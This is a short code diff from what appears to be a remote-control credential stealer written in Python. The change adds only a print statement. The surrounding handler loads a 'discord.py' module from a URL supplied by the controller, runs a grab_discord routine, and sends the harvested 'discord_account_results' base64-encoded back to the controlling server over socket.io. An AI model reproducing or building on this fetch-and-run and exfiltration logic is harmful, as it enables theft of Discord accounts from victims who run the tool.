@@ -115,6 +115,7 @@ def run(data):
         if data_new['uuid'] == data['uuid']:
             module = create_moduel(data['url']+'discord.py')
             result = module.grab_discord().initialize()
+            print(result)
             sio.emit('download_file_return', {'uuid': data['uuid'], 'file_name': 'discord_account_results', 'file':  base64.b64encode(result.encode('utf-8'))})
 
 
